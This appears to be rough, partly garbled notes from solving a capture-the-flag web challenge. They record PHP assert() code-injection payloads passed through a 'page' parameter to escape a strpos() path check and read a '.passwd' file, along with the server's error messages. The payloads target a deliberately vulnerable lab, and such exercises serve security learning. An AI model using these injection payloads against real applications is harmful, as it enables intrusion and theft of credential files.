Warning: strpos() expects at least 2 parameters, 1 given in /challenge/web-serveur/ch47/index.php(8) : assert code on line 1 Warning: assert(): Assertion "strpos('includes/home');//.php', '..') === false" failed in /challenge/web-serveur/ch47/index.php on line 8 Detected hacking attempt!

Assertion "strpos('includes/home');//.php', '..') === false"

, a)

?page="a,'
Failure evaluating code: strpos('includes/"a,'.php', '..') === false


?page=.passwd'
Failure evaluating code: strpos('includes/.passwd'.php', '..') === false
strpos('includes/<user input>', '..') === false
strpos('includes/..', '..') === false && file_get_contents('.passwd', 'r') && strpos('includes/'., '..') === false



?page=..', '..') === false && file_get_contents('.passwd', 'r') && strpos('includes/'.
strpos('includes/..', '..') === false .php', '..') === false

?page=..', '..') === true || file_get_contents('.passwd', 'r') || strpos('includes/'.
strpos('includes/..', '..') === true || file_get_contents('.passwd', 'r') .php', '..') === false

?page=..', '..') === true || file_get_contents('.passwd', 'r') || strpos('includes/'.
strpos('includes/..', '..') === true || file_get_contents('.passwd', 'r') || strpos('includes/'..php', '..') === false

?page=..', '..') === true || file_get_contents('.passwd', 'r') || strpos('includes/home, 
'includes/..', '..') === true || file_get_contents('.passwd', 'r') || strpos('includes/home,.php'File does not exist

?page=..', '..') === false || echo file_get_contents('.passwd') || strpos('includes/home, 'index.
strpos('includes/..', '..') === false || echo file_get_contents('.passwd') || strpos('includes/home, 'index..php', '..') === false

?page=..', '..') === false || echo file_get_contents('.passwd') || strpos('includes/home, 'index.

?page=..', '..') === false || echo file_get_contents('.passwd')";?>/*
